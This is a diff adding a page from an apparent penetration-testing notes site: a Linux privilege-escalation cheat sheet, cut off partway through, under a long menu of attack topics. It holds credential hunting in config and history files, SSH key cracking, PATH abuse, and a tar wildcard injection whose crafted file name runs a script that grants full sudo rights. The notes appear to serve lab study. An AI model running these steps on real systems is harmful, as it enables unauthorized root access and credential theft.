+      <a href="/notes/ad/ad-cs/">AD CS</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/av-amsi-bypass/">AV &amp; AMSI Bypass</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/c2/">C2</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/delegation/">Delegation</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/discovery/">Discovery</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/hash-stealing/">Hash stealing</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/kerberoast-asreproast/">Kerberoast-Asreproast</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/krbrelaiup/">KrbRelaiUp</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/linux/">Linux</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/ntlm-relay/">Ntlm Relay</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/password-looting/">Password looting</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/phishing/">Phishing</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/pivot/">Pivot</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tickets/">Tickets</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/transfert/">Transfert</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/trust-attack/">Trust Attack</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Reverse Shell</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/shell-and-payload/bash/">Bash</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/msfvenom/">MsfVenom</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/netcat/">Netcat</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/nodejs/">Nodejs</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/php-monkey/">Php-Monkey</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/powershell/">Powershell</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/pownyshell/">PownyShell</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/python/">Python</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/upgrade/">Upgrade</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Webs</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/web/access-control/">Access Control</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/api-testing/">API Testing</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/authentication/">Authentication</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/command-injection/">Command Injection</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/deserialization/">Deserialization</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/file-upload/">File Upload</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/git/">Git</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/graphsql/">Graphsql</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/jwt/">JWT</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/path-traversal/">Path Traversal</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/race-conditon/">Race Conditon</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/ssrf/">SSRF</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/web-cache/">Web Cache</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/wordpress/">Wordpress</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/xss/">XSS</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/xxe/">XXE</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Services</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/services/ftp/">FTP</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/iis/">IIS</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/ldap/">Ldap</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/mssql-mysql/">Mssql-Mysql</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/rpcbind/">RPCbind</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/rsync/">Rsync</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/rtsp/">RTSP</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/smtp/">SMTP</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/snmp/">SNMP</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Labs</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+    <details>
+      <summary>HTB</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/lab/htb/analysis/">Analysis</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/caption/">Caption</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/certified/">Certified</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/cicada/">Cicada</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/hospital/">Hospital</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/infiltrator/">Infiltrator</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/perfection/">Perfection</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/pov/">POV</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Vulnlab</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/lab/vulnlab/baby/">Baby</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/baby2/">Baby2</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/breach/">Breach</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/bruno/">Bruno</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/build/">Build</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/data/">Data</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/delegate/">Delegate</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/escape/">Escape</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/feedback/">Feedback</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/forgotten/">Forgotten</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/heron/">Heron</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/hybrid/">Hybrid</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/lock/">Lock</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/media/">Media</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/reflection/">Reflection</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/retro/">Retro</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/sendai/">Sendai</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/sync/">Sync</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/tea/">Tea</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/tengu/">Tengu</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/trusted/">Trusted</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Pwn-Reverse</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/pwn-reverse/android-emulation/">Android Emulation</a>
+  </li>
+
+  <li>
+    <details>
+      <summary>CTf</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/pwn-reverse/chall/introduction-to-the-geomyides/">Introduction to the Geomyides</a>
+  </li>
+
+  <li>
+      <a href="/notes/pwn-reverse/chall/keygen-me/">Keygen-Me</a>
+  </li>
+
+  <li>
+      <a href="/notes/pwn-reverse/chall/simple-encryptor/">Simple Encryptor</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Dev</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/code/bash/">Bash</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/c/">C</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/c-/">C&#43;&#43;</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/go/">Go</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/java/">Java</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/lua/">Lua</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/nodejs/">Nodejs</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/php/">Php</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/ruby/">Ruby</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Ressources</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/ressources/arch-setup/">Arch-Setup</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/command-linux/">Command Linux</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/debian-setup/">Debian-Setup</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/kvm/">Kvm</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/link/">Link</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/tmux/">Tmux</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Crypto</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/crypto/maths/">Maths</a>
+  </li>
+
+  <li>
+      <a href="/notes/crypto/scripting/">Scripting</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+  </ul>
+</nav>
+
+  
+
+		</div>
+		
+		<nav class="docs-toc d-none d-xl-block col-xl-3" aria-label="Secondary navigation">
+			<div class="page-links">
+  <h3>On this page</h3>
+    <nav id="toc">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#information-gathering">Information Gathering</a></li>
+        <li><a href="#environment-based-privilege-escalation">Environment-based Privilege Escalation</a></li>
+        <li><a href="#permissions-based-privilege-escalation">Permissions-based Privilege Escalation</a></li>
+        <li><a href="#service-based-privilege-escalation">Service-based Privilege Escalation</a></li>
+        <li><a href="#linux-internals-based-privilege-escalation">Linux Internals-based Privilege Escalation</a></li>
+        <li><a href="#resources">Resources</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+</div>
+
+		</nav>
+		<main class="docs-content col-lg-11 col-xl-9">
+		
+			<h1>Linux Privesc</h1>
+			
+			<nav class="toc-mobile d-xl-none" aria-label="Quaternary navigation">
+				<details>
+    <summary>On this page</summary>
+    <div class="page-links">
+      <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#information-gathering">Information Gathering</a></li>
+        <li><a href="#environment-based-privilege-escalation">Environment-based Privilege Escalation</a></li>
+        <li><a href="#permissions-based-privilege-escalation">Permissions-based Privilege Escalation</a></li>
+        <li><a href="#service-based-privilege-escalation">Service-based Privilege Escalation</a></li>
+        <li><a href="#linux-internals-based-privilege-escalation">Linux Internals-based Privilege Escalation</a></li>
+        <li><a href="#resources">Resources</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+  </details>
+
+			</nav>
+			<h3 id="information-gathering">Information Gathering<a href="#information-gathering" class="anchor" aria-hidden="true">#</a> </h3>
+<h4 id="environment-enumeration">Environment Enumeration<a href="#environment-enumeration" class="anchor" aria-hidden="true">#</a> </h4>
+<p>#Environment_Enumeration</p>
+<ul>
+<li>Determine the operating system and version :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">cat /etc/os-release</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Display the system&rsquo;s PATH variable:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="nv">$PATH</span></span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Show the environment variables:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">env</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Display detailed system information:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">uname -a</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Gather information about the CPU type/version:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">lscpu</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Identify available login shells :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">cat /etc/shells
+</span></span><span class="line"><span class="cl">bash --version</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Enumerate block devices :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">lsblk</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Check for credentials in /etc/fstab :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">cat /etc/fstab <span class="p">|</span> grep -E <span class="s1">&#39;password|username|credential&#39;</span></span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Grab a hash from id_rsa :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">ssh2john id_rsa &gt; ssh.hash
+</span></span><span class="line"><span class="cl">john --wordlist<span class="o">=</span>/usr/share/wordlist/rockyou.txt ssh.hash</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Display the routing table to view available networks and interfaces:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">netstat -rn</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Check  for domain environments and internal DNS configuration:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">cat /etc/resolv.conf</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Enumerate users from /etc/passwd:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">cat /etc/passwd <span class="p">|</span> cut -f1 -d:</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Display information about groups on the system:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">cat /etc/group</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>List members of interesting groups, e.g., &lsquo;sudo&rsquo;:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">getent group sudo</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Display information about mounted file systems:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">df -h</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Display details of unmounted file systems from /etc/fstab:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">cat /etc/fstab <span class="p">|</span> grep -v <span class="s2">&#34;#&#34;</span> <span class="p">|</span> column -t</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>List all hidden files :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">find / -type f -name <span class="s2">&#34;.*&#34;</span> -exec ls -l <span class="o">{}</span> <span class="se">\;</span> 2&gt;/dev/null <span class="p">|</span> grep htb-student</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>List all hidden directories :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">find / -type d -name <span class="s2">&#34;.*&#34;</span> -ls 2&gt;/dev/null</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Display information about temporary files and directories:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">ls -l /tmp /var/tmp /dev/shm</span></span></code></pre></div>
+  </figure>
+</div>
+<h4 id="linux-services--internals-enumeration">Linux Services &amp; Internals Enumeration<a href="#linux-services--internals-enumeration" class="anchor" aria-hidden="true">#</a> </h4>
+<p>#Linux_Services_Internals_Enumeration</p>
+<ul>
+<li>Last login on the machine:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">lastlog </span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Find some credentials :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">history</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Find history file :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">find / -type f <span class="se">\(</span> -name *_hist -o -name *_history <span class="se">\)</span> -exec ls -l <span class="o">{}</span> <span class="se">\;</span> 2&gt;/dev/null</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Proc :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"> find /proc -name cmdline -exec cat <span class="o">{}</span> <span class="se">\;</span> 2&gt;/dev/null <span class="p">|</span> tr <span class="s2">&#34; &#34;</span> <span class="s2">&#34;\n&#34;</span></span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>See installed services :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">apt list --installed <span class="p">|</span> tr <span class="s2">&#34;/&#34;</span> <span class="s2">&#34; &#34;</span> <span class="p">|</span> cut -d<span class="s2">&#34; &#34;</span> -f1,3 <span class="p">|</span> sed <span class="s1">&#39;s/[0-9]://g&#39;</span> <span class="p">|</span> tee -a installed_pkgs.list</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Compare existing binaries with the ones from GTFObins:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="k">for</span> i in <span class="k">$(</span>curl -s https://gtfobins.github.io/ <span class="p">|</span> html2text <span class="p">|</span> cut -d<span class="s2">&#34; &#34;</span> -f1 <span class="p">|</span> sed <span class="s1">&#39;/^[[:space:]]*$/d&#39;</span><span class="k">)</span><span class="p">;</span><span class="k">do</span> <span class="k">if</span> grep -q <span class="s2">&#34;</span><span class="nv">$i</span><span class="s2">&#34;</span> installed_pkgs.list<span class="p">;</span><span class="k">then</span> <span class="nb">echo</span> <span class="s2">&#34;Check GTFO for: </span><span class="nv">$i</span><span class="s2">&#34;</span><span class="p">;</span><span class="k">fi</span><span class="p">;</span><span class="k">done</span></span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Find configuration file on the machine :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">find / -type f <span class="se">\(</span> -name *.conf -o -name *.config <span class="se">\)</span> -exec ls -l <span class="o">{}</span> <span class="se">\;</span> 2&gt;/dev/null
+</span></span><span class="line"><span class="cl"><span class="c1">#or </span>
+</span></span><span class="line"><span class="cl">find / ! -path <span class="s2">&#34;*/proc/*&#34;</span> -iname <span class="s2">&#34;*config*&#34;</span> -type f 2&gt;/dev/null</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Enumerate sh file:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">find / -type f -name <span class="s2">&#34;*.sh&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#or</span>
+</span></span><span class="line"><span class="cl">sudo find / -type f -name <span class="s2">&#34;*.sh&#34;</span> -user www-data -readable
+</span></span><span class="line"><span class="cl"><span class="c1">#or</span>
+</span></span><span class="line"><span class="cl">find / -type f -name <span class="s2">&#34;*.sh&#34;</span> 2&gt;/dev/null <span class="p">|</span> grep -v <span class="s2">&#34;src\|snap\|share&#34;</span></span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li><code>strace</code> on Linux-based  :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">strace ping -c1 10.129.112.20</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Process running :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">ps aux <span class="p">|</span> grep root</span></span></code></pre></div>
+  </figure>
+</div>
+<h4 id="credential-hunting">Credential Hunting<a href="#credential-hunting" class="anchor" aria-hidden="true">#</a> </h4>
+<p>#Linux_Credential</p>
+<ul>
+<li>Wordpress Credential  :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">cat wp-config.php <span class="p">|</span> grep <span class="s1">&#39;DB_USER\|DB_PASSWORD&#39;</span></span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Website Credential :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">grep -ir <span class="s2">&#34;DB_USER\|DB_PASSWORD&#34;</span> /var/www/html</span></span></code></pre></div>
+  </figure>
+</div>
+<h3 id="environment-based-privilege-escalation">Environment-based Privilege Escalation<a href="#environment-based-privilege-escalation" class="anchor" aria-hidden="true">#</a> </h3>
+<p>#Path_Abuse</p>
+<ul>
+<li>Path Abuse:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="nv">PATH</span> <span class="o">=</span>.:<span class="si">${</span><span class="nv">PATH</span><span class="si">}</span>
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> PATH
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="nv">$PATH</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#then </span>
+</span></span><span class="line"><span class="cl">touch ls
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;echo &#34;PATH ABUSE!!&#34;&#39;</span> &gt; ls
+</span></span><span class="line"><span class="cl">chmod +x ls</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Exemple of another Path Abuse :
+https://medium.com/purplebox/linux-privilege-escalation-with-path-variable-suid-bit-6b9c492411de</li>
+</ul>
+<p><strong>Wildcard Abuse</strong>
+#Wildcard_Abuse</p>
+<ul>
+<li>Example of wildcard abuse :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;echo &#34;htb-student ALL=(root) NOPASSWD: ALL&#34; &gt;&gt; /etc/sudoers&#39;</span> &gt; root.sh
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;&#34;</span> &gt; <span class="s2">&#34;--checkpoint-action=exec=sh root.sh&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;&#34;</span> &gt; --checkpoint<span class="o">=</span><span class="m">1</span></span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Output:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">htb-student@NIX02:~$ ls -la
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">total <span class="m">56</span>
+</span></span><span class="line"><span class="cl">drwxrwxrwt <span class="m">10</span> root        root        <span class="m">4096</span> Aug <span class="m">31</span> 23:12 .
